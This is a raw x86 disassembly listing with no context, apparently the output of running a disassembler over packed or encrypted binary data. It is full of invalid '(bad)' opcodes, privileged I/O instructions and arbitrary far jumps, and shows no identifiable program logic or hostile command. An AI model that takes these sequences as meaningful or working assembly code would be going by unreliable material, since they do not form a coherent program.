  42483b:	xlat   BYTE PTR ds:[ebx]
  42483c:	ds mov edi,0x102087f7
	...
  4248b2:	add    BYTE PTR [eax],al
  4248b4:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  4248bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248bc:	arpl   WORD PTR [ecx+0x31],dx
  4248bf:	je     0x42487a
  4248c1:	dec    ebp
  4248c2:	xchg   DWORD PTR [ecx+0x6],ebx
  4248c5:	xchg   BYTE PTR [ecx],al
  4248c7:	add    dh,dh
  4248c9:	add    BYTE PTR [eax],al
  4248cb:	add    BYTE PTR [eax+ebp*4+0x3d],dh
  4248cf:	ror    DWORD PTR [eax+ebx*4+0x63642dfc],cl
  4248d6:	mov    al,ds:0x874573d3
  4248db:	sbb    al,BYTE PTR [ecx-0x1dd311f6]
  4248e1:	ins    DWORD PTR es:[edi],dx
  4248e2:	mov    edx,0xca5515c8
  4248e7:	test   BYTE PTR [esi],0x48
  4248ea:	(bad)  
  4248eb:	push   edx
  4248ec:	xchg   esp,eax
  4248ed:	mov    ch,0xa0
  4248ef:	inc    ebp
  4248f0:	lahf   
  4248f1:	and    al,0xce
  4248f3:	mov    ds:0xba8ef15,al
  4248f8:	adc    esp,ebp
  4248fa:	(bad)  
  4248fc:	aas    
  4248fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248fe:	pushw  es
  424900:	push   esi
  424901:	in     eax,0x15
  424903:	jb     0x4248db
  424905:	mov    dh,0xe0
  424907:	cmp    eax,0x186b652b
  42490c:	je     0x42492a
  42490e:	inc    ebp
  42490f:	dec    eax
  424910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424911:	mov    cl,0xa0
  424913:	xchg   ecx,eax
  424914:	and    eax,0xab6c1290
  424919:	pop    ebp
  42491a:	add    bl,ah
  42491c:	pop    es
  42491d:	xchg   esp,eax
  42491e:	push   ecx
  42491f:	inc    esi
  424920:	test   ebx,esi
  424922:	fwait
  424923:	std    
  424924:	or     eax,0xe1961ffd
  424929:	pushfw 
  42492b:	and    DWORD PTR [eax+0x76d37676],0x7c
  424932:	inc    esi
  424933:	jo     0x4248d9
  424935:	popa   
  424936:	mov    al,0x72
  424938:	hlt    
  424939:	sub    DWORD PTR [ecx-0x2d],esi
  42493c:	add    ebp,DWORD PTR [ecx*4+0x6612ee69]
  424943:	frstor [edi]
  424945:	jecxz  0x4248d7
  424947:	adc    esp,ebp
  424949:	retf   0x3405
  42494c:	xor    eax,0x429f9c1e
  424951:	mov    edi,DWORD PTR [esi+edi*8-0x2a]
  424955:	out    dx,al
  424956:	pop    ecx
  424957:	or     eax,0x709931b9
  42495c:	pushf  
  42495d:	or     al,0x74
  42495f:	aaa    
  424960:	and    ebx,DWORD PTR [edx-0x51]
  424963:	adc    DWORD PTR [ecx],ebx
  424965:	pop    ds
  424966:	inc    ecx
  424967:	xchg   edx,eax
  424968:	mov    ebp,0x2bd0b587
  42496d:	mov    BYTE PTR [eax+0x39],bl
  424970:	xchg   ebx,eax
  424971:	sbb    DWORD PTR [edi*8+0x3d2826e7],esp
  424978:	sbb    BYTE PTR [ebx-0x5ebbe3a0],0xa7
  42497f:	or     ebp,DWORD PTR [ecx+0x2857284d]
  424985:	out    dx,al
  424986:	retf   0xdfd0
  424989:	aas    
  42498a:	in     eax,0x3f
  42498c:	lods   eax,DWORD PTR ds:[esi]
  42498d:	jecxz  0x424962
  42498f:	add    bh,BYTE PTR ds:0x778095c0
  424995:	push   ebx
  424996:	lods   eax,DWORD PTR ds:[esi]
  424997:	and    al,0x37
  424999:	lds    eax,FWORD PTR [eax+ebx*4+0x2f]
  42499d:	sbb    ebx,edi
  42499f:	xchg   BYTE PTR [esi-0x2e6c8b93],al
  4249a5:	pop    ss
  4249a6:	or     al,0xec
  4249a8:	jp     0x4249b7
  4249aa:	hlt    
  4249ab:	sub    BYTE PTR [ebx+0x72],cl
  4249ae:	fisttp QWORD PTR [ebx]
  4249b0:	call   0x62b0:0xbc35bbda
  4249b7:	lods   al,BYTE PTR ds:[esi]
  4249b8:	call   0x97e45b83
  4249bd:	addr16 xchg ebx,eax
  4249bf:	cmp    eax,0xab04
	...
  424a34:	xor    BYTE PTR ds:0xdf7d9f75,bh
  424a3a:	cli    
  424a3b:	mov    edi,0x13301881
  424a40:	pop    ecx
  424a41:	push   eax
  424a42:	mov    esp,0x186fcfe
  424a47:	add    dh,dh
  424a49:	add    BYTE PTR [eax],al
  424a4b:	add    BYTE PTR ds:0x643e6900,cl
  424a51:	lock push esp
  424a53:	inc    eax
  424a54:	or     ebx,DWORD PTR [edx]
  424a56:	and    eax,0x25e98722
  424a5b:	xchg   edi,eax
  424a5c:	mov    ecx,0x9080ccb6
  424a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a62:	cld    
  424a63:	sub    DWORD PTR [esi+0x72],eax
  424a66:	push   cs
  424a67:	and    BYTE PTR [edx+0x8],dl
  424a6a:	aam    0xb7
  424a6c:	mov    edi,0xfc181549
  424a71:	test   BYTE PTR [edi],ch
  424a73:	fldcw  WORD PTR [edi+0x36d7b553]
  424a79:	xchg   esi,eax
  424a7a:	ja     0x424a57
  424a7c:	adc    cl,BYTE PTR [ecx+0x782d81b8]
  424a82:	push   esp
  424a83:	jle    0x424a15
  424a85:	inc    edi
  424a86:	clc    
  424a87:	es cmc 
  424a89:	xor    dh,BYTE PTR [ebx+edx*2-0x5d1e9e62]
  424a90:	sub    dl,BYTE PTR [edi+0x75728d8c]
  424a96:	mov    ecx,0x7c797005
  424a9b:	in     eax,dx
  424a9c:	pop    esi
  424a9d:	pop    edx
  424a9e:	push   edi
  424a9f:	xchg   edi,eax
  424aa0:	data16 stc 
  424aa2:	jns    0x424b0b
  424aa4:	jp     0x424b02
  424aa6:	xor    ecx,DWORD PTR [esi+0x75]
  424aa9:	mov    BYTE PTR [ebp-0x7d],cl
  424aac:	mov    edx,0xc7f7873f
  424ab1:	aas    
  424ab2:	lds    edi,FWORD PTR [edi]
  424ab4:	mov    WORD PTR [eax],gs
  424ab6:	mov    edx,0x9f4f9da3
  424abb:	outs   dx,BYTE PTR ds:[esi]
  424abc:	push   ss
  424abd:	jmp    0x64bf479
  424ac2:	mov    ds:0x86d8724a,al
  424ac7:	xlat   BYTE PTR ds:[ebx]
  424ac8:	pusha  
  424ac9:	sub    al,dh
  424acb:	inc    edi
  424acc:	bound  esp,QWORD PTR ds:0xaa3987e4
  424ad2:	inc    esp
  424ad3:	aas    
  424ad4:	ja     0x424ac7
  424ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ad7:	out    0x8f,eax
  424ad9:	inc    eax
  424ada:	mov    ecx,0x21735774
  424adf:	or     al,0xeb
  424ae1:	push   ds
  424ae2:	adc    eax,0x1a562cdc
  424ae7:	leave  
  424ae8:	pop    ecx
  424ae9:	cwde   
  424aea:	adc    al,BYTE PTR [ecx+ebx*8+0x11]
  424aee:	pop    eax
  424aef:	outs   dx,BYTE PTR ds:[esi]
  424af0:	mov    al,0xe5
  424af2:	inc    esi
  424af3:	xchg   edx,eax
  424af4:	and    dh,bh
  424af6:	jne    0x424adc
  424af8:	xchg   BYTE PTR [eax-0x7b],ch
  424afb:	mov    ds:0x9cc031ff,eax
  424b00:	push   eax
  424b01:	ins    BYTE PTR es:[edi],dx
  424b02:	sub    ah,BYTE PTR [ecx+0x5419020f]
  424b08:	mov    BYTE PTR [edx],dl
  424b0a:	xlat   BYTE PTR ds:[ebx]
  424b0b:	pusha  
  424b0c:	in     al,dx
  424b0d:	dec    edi
  424b0e:	sub    ch,dh
  424b10:	out    dx,al
  424b11:	inc    ecx
  424b12:	stc    
  424b13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b14:	jne    0x424b37
  424b16:	ffree  st(4)
  424b18:	fld    st(5)
  424b1a:	repnz mov esp,ebx
  424b1d:	push   ecx
  424b1e:	push   ecx
  424b1f:	and    ah,0x9a
  424b22:	or     eax,0xb23111fd
  424b27:	mov    ah,0x68
  424b29:	push   esi
  424b2a:	call   0xe449:0xa6a7b68f
  424b31:	ja     0x424b4f
  424b33:	cs pop edx
  424b35:	mov    esp,0xd8439727
  424b3a:	jns    0x424b69
  424b3c:	nop
  424b3d:	fld    TBYTE PTR [edx+0x3f]
  424b40:	xor    eax,DWORD PTR [eax+eax*1]
	...
  424bb3:	add    ch,bh
  424bb5:	(bad)  
  424bb6:	test   eax,0xff57ab46
  424bbb:	jmp    FWORD PTR [edx-0x27b9f881]
  424bc1:	pusha  
  424bc2:	cwde   
  424bc3:	pop    ebp
  424bc4:	xacquire xchg DWORD PTR [ecx],eax
  424bc7:	add    dh,dh
  424bc9:	add    BYTE PTR [eax],al
  424bcb:	add    BYTE PTR [eax-0x2a617c31],ah
  424bd1:	imul   edx,ecx,0xe1ecd56f
  424bd7:	sbb    edi,DWORD PTR [ebp+0x26]
  424bda:	sbb    edi,DWORD PTR [esi+ecx*1+0x47]
  424bde:	bound  esp,QWORD PTR [ecx]
  424be0:	adc    ecx,0x8e374e1
  424be6:	sbb    eax,0x87cc584e
  424beb:	jmp    0xa84c:0xb9818630
  424bf2:	mov    ss,WORD PTR [edx+0x69]
  424bf5:	sbb    bh,BYTE PTR cs:[eax+0x4f]
  424bf9:	mov    ds:0xe5fc6f0,al
  424bfe:	xchg   esp,eax
  424bff:	jae    0x424c5f
  424c01:	cs fwait
  424c03:	popa   
  424c04:	dec    ebx
  424c05:	and    DWORD PTR [eax+0x9],0xffffffa0
  424c09:	stos   DWORD PTR es:[edi],eax
  424c0a:	and    BYTE PTR [ebp-0x3d],cl
  424c0d:	std    
  424c0e:	rol    DWORD PTR [esi],cl
  424c10:	adc    DWORD PTR [edx],edi
  424c12:	icebp  
  424c13:	les    edx,FWORD PTR [ecx]
  424c15:	test   ch,bl
  424c17:	pusha  
  424c18:	jae    0x424c83
  424c1a:	cli    
  424c1b:	adc    edi,DWORD PTR [ebx]
  424c1d:	sub    ch,BYTE PTR es:[esi-0x73]
  424c21:	xchg   ecx,eax
  424c22:	and    DWORD PTR [ebx-0x41],0x69d93d3
  424c29:	arpl   WORD PTR [esi],bp
  424c2b:	(bad)  
  424c2c:	ds mov bl,0xe0
  424c2f:	loop   0x424bd9
  424c31:	mov    ?,WORD PTR [ecx-0x7682fafe]
  424c37:	loop   0x424bdc
  424c39:	(bad)  
  424c3a:	lds    ebx,FWORD PTR [eax-0x35]
  424c3d:	xchg   ebp,eax
  424c3e:	enter  0x22ee,0x8f
  424c42:	push   ds
  424c43:	test   eax,0xef952cc5
  424c48:	mov    ebx,gs
  424c4a:	xchg   DWORD PTR [ecx-0x3a74570a],ebx
  424c50:	pop    ss
  424c51:	popa   
  424c52:	call   0xe5ae01e0
  424c57:	xor    al,BYTE PTR [eax+0x6f0486a1]
  424c5d:	out    dx,eax
  424c5e:	int    0x57
  424c60:	cmp    esp,DWORD PTR [eax]
  424c62:	xchg   esp,eax
  424c63:	push   ecx
  424c64:	(bad)  
  424c65:	push   eax
  424c66:	jae    0x424ce0
  424c68:	stos   DWORD PTR es:[edi],eax
  424c69:	push   0x6485c1b9
  424c6e:	shl    cl,1
  424c70:	inc    eax
  424c71:	dec    edi
  424c72:	ja     0x424c99
  424c74:	and    esp,edx
  424c76:	bound  esi,QWORD PTR [ecx-0x2f9c2d93]
  424c7c:	div    bh
  424c7e:	dec    edx
  424c7f:	adc    al,0x72
  424c81:	jl     0x424c50
  424c83:	dec    ecx
  424c84:	data16 mov WORD PTR [edi+0x6a3f5a2d],?
  424c8b:	and    eax,0x387e5cbb
  424c90:	sub    edi,DWORD PTR [ebp-0x18]
  424c93:	mov    ebx,0xab9b33f
  424c98:	and    eax,0x56a0e492
  424c9d:	dec    ebx
  424c9e:	sbb    ebx,ebx
  424ca0:	jmp    0x4f65:0xfeae0eab
  424ca7:	pop    edx
  424ca8:	fistp  DWORD PTR [edi]
  424caa:	in     al,dx
  424cab:	cdq    
  424cac:	cmp    al,0x32
  424cae:	jbe    0x424cf3
  424cb0:	jnp    0x424c54
  424cb2:	push   ebx
  424cb3:	repnz xchg ebx,eax
  424cb5:	out    dx,al
  424cb6:	lahf   
  424cb7:	sub    eax,0xe8426528
  424cbc:	js     0x424cb4
  424cbe:	(bad)  
  424cbf:	outs   dx,DWORD PTR ds:[esi]
  424cc0:	or     eax,0xa0
	...
  424d31:	add    BYTE PTR [eax],al
  424d33:	add    BYTE PTR [edx-0xa],ah
  424d36:	xchg   DWORD PTR [ecx],ecx
  424d38:	xchg   edi,eax
  424d39:	jns    0x424d29
  424d3b:	inc    DWORD PTR [ecx+ecx*4+0x589394d7]
  424d42:	mov    bl,0x97
  424d44:	call   0xf6424ed1
  424d49:	add    BYTE PTR [eax],al
  424d4b:	add    BYTE PTR [ecx],bl
  424d4d:	ja     0x424d93
  424d4f:	mov    esi,DWORD PTR [ebx+0x2e]
  424d52:	lods   eax,DWORD PTR ds:[esi]
  424d53:	mov    edi,0x8c34e1df
  424d58:	sbb    dh,dh
  424d5a:	cmp    eax,0xf5a3cb60
  424d5f:	cs out dx,al
  424d61:	(bad)  [ebx+0x54af39ed]
  424d67:	ficomp WORD PTR [esp+edx*2-0x17]
  424d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d6c:	dec    ebp
  424d6d:	dec    ebp
  424d6e:	and    ah,bh
  424d70:	sub    BYTE PTR [ebx-0x1f],bl
  424d73:	mov    bl,0xfe
  424d75:	addr16 push edx
  424d77:	and    BYTE PTR [ebx-0x48],0x36
  424d7b:	ss mov ch,0xdf
  424d7e:	jp     0x424d08
  424d80:	inc    sp
  424d82:	xchg   esp,eax
  424d83:	in     eax,dx
  424d84:	dec    ecx
  424d85:	xchg   edi,eax
  424d86:	lock xchg BYTE PTR [edx+eiz*1+0x7e40b55f],dl
  424d8e:	adc    al,0x8a
  424d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d91:	cs cmp eax,0x32562c27
  424d97:	bound  edx,QWORD PTR ds:0xee91fd0a
  424d9d:	fadd   DWORD PTR [ebp+0x7]
  424da0:	loope  0x424d30
  424da2:	or     eax,0xdb00545
  424da7:	cmp    edi,ebp
  424da9:	mul    DWORD PTR [edx]
  424dab:	ins    DWORD PTR es:[edi],dx
  424dac:	in     al,dx
  424dad:	lahf   
  424dae:	adc    BYTE PTR [ebx+0x1b],0xa0
  424db2:	push   0xee7cff11
  424db7:	mov    BYTE PTR [ebx-0x76cd339],ch
  424dbd:	fbstp  TBYTE PTR [esi]
  424dbf:	push   0xffffffe0
  424dc1:	enter  0x8ed5,0x53
  424dc5:	adc    DWORD PTR [ebx-0xe],esi
  424dc8:	mov    edx,0x71cd8c53
  424dcd:	(bad)  
  424dce:	mov    ds:0x894b120a,al
  424dd3:	mov    ds:0xf4c077ac,al
  424dd8:	cmc    
  424dd9:	dec    ebp
  424dda:	and    al,0xfd
  424ddc:	cmp    bh,ch
  424dde:	int3   
  424ddf:	pushf  
  424de0:	adc    DWORD PTR [ecx+0x7a],esp
  424de3:	js     0x424e24
  424de5:	out    0x34,al
  424de7:	or     ecx,DWORD PTR [edi]
  424de9:	mov    WORD PTR [edx+0x6262f62c],fs
  424def:	(bad)  
  424df0:	jno    0x424dc7
  424df2:	xchg   edi,eax
  424df3:	jo     0x424dfe
  424df5:	cmp    eax,0x3f3a7b87
  424dfa:	dec    edx
  424dfb:	rol    ecx,cl
  424dfd:	pop    esp
  424dfe:	(bad)  [ebx-0x33e2cfd6]
  424e04:	scas   al,BYTE PTR es:[edi]
  424e05:	nop
  424e06:	dec    ebx
  424e07:	pop    ss
  424e08:	pop    ebp
  424e09:	mov    dh,0x6d
  424e0b:	pop    esp
  424e0c:	pop    edx
  424e0d:	sti    
  424e0e:	retf   
  424e0f:	sbb    bl,BYTE PTR [ecx+0x374bbce9]
  424e15:	mov    ds:0x39fbf77e,al
  424e1a:	pop    edx
  424e1b:	(bad)  
  424e1d:	repz fprem1 
  424e20:	mov    al,ds:0x1e191b92
  424e25:	inc    edx
  424e26:	mov    ch,0x9c
  424e28:	loope  0x424e0f
  424e2a:	dec    esi
  424e2b:	adc    dl,cl
  424e2d:	icebp  
  424e2e:	dec    eax
  424e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e30:	nop
  424e31:	clc    
  424e32:	rcl    BYTE PTR [eax-0x7e],1
  424e35:	test   eax,0x7dfba32c
  424e3a:	jno    0x424e15
  424e3c:	mov    ecx,0xfa61614b
  424e41:	and    BYTE PTR [eax],al
	...
  424eb3:	add    BYTE PTR [esi+0x74b9649a],ch
  424eb9:	(bad)  
  424eba:	call   FWORD PTR [edi-0x6d72b26e]
  424ec0:	sar    DWORD PTR [eax-0x762129b1],cl
  424ec6:	add    DWORD PTR [eax],eax
  424ec8:	test   BYTE PTR [eax],0x0
  424ecb:	add    bh,ch
  424ecd:	outs   dx,DWORD PTR ds:[esi]
  424ece:	xor    eax,0x8914cefc
  424ed3:	fstp   DWORD PTR [edi]
  424ed5:	lods   eax,DWORD PTR ds:[esi]
  424ed6:	mov    esi,0xf0d43388
  424edb:	cld    
  424edc:	adc    ch,dl
  424ede:	pop    esi
  424edf:	in     al,0xcb
  424ee1:	adc    ecx,esp
  424ee3:	push   edx
  424ee4:	outs   dx,DWORD PTR ds:[esi]
  424ee5:	retf   
  424ee6:	repnz xor al,0x25
  424ee9:	lods   eax,DWORD PTR ds:[esi]
  424eea:	push   ss
  424eeb:	daa    
  424eec:	nop
  424eed:	add    DWORD PTR [edx+0x37],0x44135093
  424ef4:	mov    eax,ds:0xf8968c0e
  424ef9:	jno    0x424f32
  424efb:	sub    ebp,ebx
  424efd:	xchg   edx,eax
  424efe:	jl     0x424e91
  424f00:	xor    BYTE PTR [ecx-0x14],0x3a
  424f04:	popf   
  424f05:	mov    edi,0xc12e40b
  424f0a:	cmp    eax,0x101bc0a6
  424f0f:	jge    0x424f43
  424f11:	xchg   DWORD PTR [esi],edx
  424f13:	add    BYTE PTR [edx+esi*2],0x67
  424f17:	jae    0x424f88
  424f19:	(bad)  [ecx-0x64]
  424f1c:	inc    ecx
  424f1d:	push   ss
  424f1e:	arpl   WORD PTR [ebp-0x6766d269],cx
  424f24:	cdq    
  424f25:	dec    esp
  424f26:	fs and ebx,ecx
  424f29:	outs   dx,BYTE PTR ds:[esi]
  424f2a:	mov    eax,ds:0x4d79a1a0
  424f2f:	stc    
  424f30:	xor    al,0x9f
  424f32:	loop   0x424f03
  424f34:	sub    ebp,DWORD PTR [edi+0x14]
  424f37:	push   es
  424f38:	add    ah,0x69
  424f3b:	bound  ebp,QWORD PTR [ecx+0x2af73761]
  424f41:	adc    al,0x14
  424f43:	vpshaq ymm9,xmm7,[ecx-0x80]
  424f49:	imul   ecx,esi,0x3e11676
  424f4f:	call   0x8a4f36e7
  424f54:	sub    ebp,ebp
  424f56:	dec    ebx
  424f57:	jmp    0x424ee8
  424f59:	leave  
  424f5a:	aam    0x9d
  424f5c:	jl     0x424eeb
  424f5e:	mov    edx,0xba6ff565
  424f63:	mov    ds:0xe7ca28d1,al
  424f68:	retf   0xbe22
  424f6b:	push   ds
  424f6c:	mov    bl,0xa0
  424f6e:	adc    al,0x33
  424f70:	mov    edx,0xb78db8d6
  424f75:	mov    cl,0x6b
  424f77:	sub    dl,BYTE PTR [eax+0x67]
  424f7a:	push   ebp
  424f7b:	xor    eax,0xaac1aa38
  424f80:	and    eax,DWORD PTR [eax]
  424f82:	pop    ebp
  424f83:	xlat   BYTE PTR ds:[ebx]
  424f84:	xchg   ebp,eax
  424f85:	stos   DWORD PTR es:[edi],eax
  424f86:	mov    eax,ds:0x66407334
  424f8b:	sbb    BYTE PTR [ebp+edi*1+0x3ba1328b],bl
  424f92:	xchg   esp,eax
  424f93:	add    bl,0xfc
  424f96:	scas   al,BYTE PTR es:[edi]
  424f97:	in     eax,dx
  424f98:	psubq  mm7,mm1
  424f9b:	gs pop ecx
  424f9d:	pop    ss
  424f9e:	jb     0x42500f
  424fa0:	mov    bh,0xaf
  424fa2:	cmp    eax,0xea043e5e
  424fa7:	aas    
  424fa8:	push   0x63
  424faa:	push   ebx
  424fab:	adc    esi,edx
  424fad:	mov    ?,ecx
  424faf:	sti    
  424fb0:	in     al,0x10
  424fb2:	pop    ebx
  424fb3:	mov    al,ds:0x8da4ebac
  424fb8:	out    dx,eax
  424fb9:	mov    ds:0x407b42ba,al
  424fbe:	ss aad 0x68
  424fc1:	fld    QWORD PTR [eax]
	...
  425033:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  425037:	mov    cl,0x2e
  425039:	idiv   edi
  42503b:	fst    st(3)
  42503d:	inc    eax
  42503e:	sahf   
  42503f:	pop    ds
  425040:	sub    BYTE PTR [ebp-0x18],cl
  425043:	daa    
  425044:	aam    0x8a
  425046:	add    DWORD PTR [eax],eax
  425048:	test   BYTE PTR [eax],0x0
  42504b:	add    BYTE PTR [ebx-0x43],ah
  42504e:	mov    edx,0x39363468
  425053:	cmp    BYTE PTR [eax-0x1feaba2c],ch
  425059:	fcomp  DWORD PTR [eax*1+0x2b3aa1f9]
  425060:	inc    edx
  425061:	ins    BYTE PTR es:[edi],dx
  425062:	repnz sbb esi,ecx
  425065:	add    al,0x5f
  425067:	rol    ah,cl
  425069:	ds test esi,0x700f4bb5
  425070:	push   edi
  425071:	jle    0x424ff8
  425073:	push   ss
  425074:	bound  edx,QWORD PTR [ebx-0x46]
  425077:	jecxz  0x425033
  425079:	imul   esp,DWORD PTR [esi],0x12
  42507c:	call   0x8f8:0xdecc22aa
  425083:	hlt    
  425084:	fild   WORD PTR [ebp-0x8]
  425087:	push   es
  425088:	test   al,0x65
  42508a:	jo     0x4250cf
  42508c:	sbb    al,0xb8
  42508e:	xor    DWORD PTR [edi+ebx*8+0x73],eax
  425092:	clc    
  425093:	stc    
  425094:	sbb    al,0xe7
  425096:	push   ebx
  425097:	jg     0x425039
  425099:	or     eax,0x877b8353
  42509e:	fisttp QWORD PTR [esi-0x5da84bb4]
  4250a4:	(bad)  
  4250a5:	jae    0x4250c6
  4250a7:	in     al,0xb2
  4250a9:	lods   al,BYTE PTR ds:[esi]
  4250aa:	pop    esp
  4250ab:	cmp    eax,0x8b2a53c0
  4250b0:	aas    
  4250b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4250b2:	inc    esi
  4250b3:	adc    ch,BYTE PTR [edi+eiz*1+0x6f]
  4250b7:	or     BYTE PTR [esi+edx*8-0x43023a8d],bh
  4250be:	fimul  WORD PTR [esi+0x7a]
  4250c1:	jmp    0xa7a2:0xcbbbb040
  4250c8:	and    DWORD PTR [ebp-0x493ac252],ecx
  4250ce:	mov    esp,0x9c526cbe
  4250d3:	out    0x1d,eax
  4250d5:	or     dl,dl
  4250d7:	mov    bh,0xf8
  4250d9:	xchg   DWORD PTR [ecx-0x65ea0b06],ebx
  4250df:	pop    eax
  4250e0:	ins    DWORD PTR es:[edi],dx
  4250e1:	mov    eax,0x96f4ed6e
  4250e6:	sbb    WORD PTR [eax+0x43],bx
  4250ea:	hlt    
  4250eb:	mov    edx,0xdeb3db28
  4250f0:	adc    esp,DWORD PTR [ecx+ebp*1]
  4250f3:	pop    ds
  4250f4:	push   0xffffffc6
  4250f6:	jbe    0x425084
  4250f8:	adc    dl,al
  4250fa:	sbb    al,0x49
  4250fc:	and    eax,DWORD PTR [ebp+ecx*4+0x7d]
  425100:	add    al,0xd1
  425102:	daa    
  425103:	lods   eax,DWORD PTR ds:[esi]
  425104:	mov    BYTE PTR [edi+0x647c4b3e],bh
  42510a:	out    0x4,eax
  42510c:	pop    es
  42510d:	out    dx,eax
  42510e:	jne    0x4250ff
  425110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425111:	mov    ecx,0x36b67615
  425116:	jge    0x4250ad
  425118:	cmp    al,0x5d
  42511a:	(bad)  [ebp+0x46]
  42511d:	inc    ebx
  42511e:	sub    eax,DWORD PTR [esi-0x9]
  425121:	int3   
  425122:	hlt    
  425123:	push   ecx
  425124:	rol    DWORD PTR [eax+0x5b],cl
  425127:	js     0x42517a
  425129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42512a:	xchg   BYTE PTR [ecx+0x13efabd1],bl
  425130:	mov    edi,0x8221256b
  425135:	or     bh,al
  425137:	push   edi
  425138:	(bad)  
  425139:	sbb    al,0xad
  42513b:	lods   al,BYTE PTR ds:[esi]
  42513c:	inc    edi
  42513d:	and    DWORD PTR [ecx-0x5e],eax
  425140:	retf   0x10
	...
  4251b3:	add    BYTE PTR [edi-0x4c275c4c],al
  4251b9:	(bad)  
  4251bb:	call   DWORD PTR [esi+0x14]
  4251be:	and    esp,esi
  4251c0:	cli    
  4251c1:	lea    edi,ss:[esi+0x18bca]
  4251c8:	test   BYTE PTR [eax],0x0
  4251cb:	add    BYTE PTR [ebx],dh
  4251cd:	pop    DWORD PTR [edi]
  4251cf:	inc    esp
  4251d0:	sub    eax,0x6c7b5230
  4251d5:	sbb    DWORD PTR [ebp-0x32],0x56c8c965
  4251dc:	sub    al,BYTE PTR [edi]
  4251de:	and    DWORD PTR [edx-0x431a0a77],0x3d
  4251e5:	pop    ds
  4251e6:	inc    edx
  4251e7:	push   0x54
  4251e9:	mov    eax,edx
  4251eb:	ja     0x425211
  4251ed:	cmp    ecx,esp
  4251ef:	mov    bl,0xc3
  4251f1:	mov    esi,0x8ccefb58
  4251f6:	sub    DWORD PTR [ebx+0x23],edi
  4251f9:	lds    ebp,FWORD PTR [ebx]
  4251fb:	mov    dl,0x35
  4251fd:	mov    bl,0xd8
  4251ff:	mov    ah,0x19
  425201:	into   
  425202:	mul    BYTE PTR [eax]
  425204:	hlt    
  425205:	jmp    0xaaaa18be
  42520a:	sbb    BYTE PTR [edx],dl
  42520c:	mov    dh,0xb9
  42520e:	xchg   edx,eax
  42520f:	(bad)  
  425210:	and    DWORD PTR [ebx+eax*1+0x54],ebp
  425214:	xchg   esi,eax
  425215:	push   edi
  425216:	gs rcl ah,0x3f
  42521a:	xor    DWORD PTR [esp+ebp*1-0x27],edi
  42521e:	inc    edx
  42521f:	push   eax
  425220:	dec    edx
  425221:	xchg   ecx,eax
  425222:	cmc    
  425223:	adc    DWORD PTR [edx+esi*4+0x3d5d81f1],esi
  42522a:	inc    DWORD PTR [edx]
  42522c:	xchg   esp,edi
  42522e:	fs jno 0x4251d1
  425231:	out    0xfb,al
  425233:	and    eax,0x356f6226
  425238:	fbld   TBYTE PTR [bp+di+0x482c]
  42523d:	iret   
  42523e:	retf   
  42523f:	push   esp
  425240:	mov    ds:0xbaad2879,al
  425245:	ins    DWORD PTR es:[edi],dx
  425246:	adc    al,0x7f
  425248:	cmp    BYTE PTR [ebp+0x52],dh
  42524b:	into   
  42524c:	call   0xbae1:0xa28dec05
  425253:	fiadd  WORD PTR [edi+esi*2]
  425256:	mov    esi,0xdd3797de
  42525b:	jo     0x425252
  42525d:	not    BYTE PTR [edi]
  42525f:	gs inc esi
  425261:	cmp    ebp,DWORD PTR [edi-0x74]
  425264:	add    al,0xa5
  425266:	fwait
  425267:	shr    DWORD PTR ds:0xfef49fe9,1
  42526d:	pop    esi
  42526e:	(bad)  [edi+0x24308e79]
  425274:	add    bl,BYTE PTR [edx]
  425276:	addr16 dec esp
  425278:	mov    dh,0x24
  42527a:	stc    
  42527b:	loopne 0x4252f7
  42527d:	xlat   BYTE PTR ds:[ebx]
  42527e:	push   0x4b
  425280:	loop   0x42524e
  425282:	xchg   esp,eax
  425283:	ss adc ch,bh
  425286:	ds inc esi
  425288:	and    eax,0xff1063a6
  42528d:	ins    BYTE PTR es:[edi],dx
  42528e:	adc    edi,DWORD PTR [edi]
  425290:	push   edi
  425291:	pop    ds
  425292:	out    dx,al
  425293:	jle    0x425296
  425295:	xor    ebp,ecx
  425297:	retf   
  425298:	gs aas 
  42529a:	xchg   bl,dl
  42529c:	fadd   QWORD PTR [edx+0x53]
  42529f:	xchg   ebx,eax
  4252a0:	fadd   DWORD PTR ds:0x4998d545
  4252a6:	aam    0x53
  4252a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252a9:	push   ss
  4252aa:	xor    eax,DWORD PTR [ebx+0x52]
  4252ad:	xor    al,0x55
  4252af:	pushf  
  4252b0:	out    dx,al
  4252b1:	xlat   BYTE PTR ds:[ebx]
  4252b2:	pop    edx
  4252b3:	xchg   DWORD PTR [ebx-0x35],eax
  4252b6:	jg     0x425334
  4252b8:	sbb    al,0x6a
  4252ba:	or     eax,0x91ceb10a
  4252bf:	fcomp  QWORD PTR ds:0xc2
	...
  425331:	add    BYTE PTR [eax],al
  425333:	add    BYTE PTR [edx-0x24582da],cl
  425339:	sti    
  42533a:	iret   
  42533b:	and    DWORD PTR ss:[ebx+0x1a],ebx
  42533f:	repnz loopne 0x425301
  425342:	mov    ebx,0x18cc051
  425347:	add    dh,dh
  425349:	add    BYTE PTR [eax],al
  42534b:	add    BYTE PTR [eax],cl
  42534d:	push   ds
  42534e:	neg    BYTE PTR [ebx]
  425350:	inc    ebx
  425351:	test   eax,0x4a1a5fc1
  425356:	mov    ch,0x98
  425358:	adc    BYTE PTR [edi-0x68edde03],0x3d
  42535f:	cmp    eax,0xc9d816a3
  425364:	mov    ebx,edi
  425366:	lea    ebx,[edx-0x4699c0ac]
  42536c:	jne    0x42539e
  42536e:	test   BYTE PTR [esi+0x33],0xb2
  425372:	jnp    0x42537b
  425374:	pop    edx
  425375:	adc    bl,BYTE PTR [edx]
  425377:	loope  0x4253d7
  425379:	inc    eax
  42537a:	push   eax
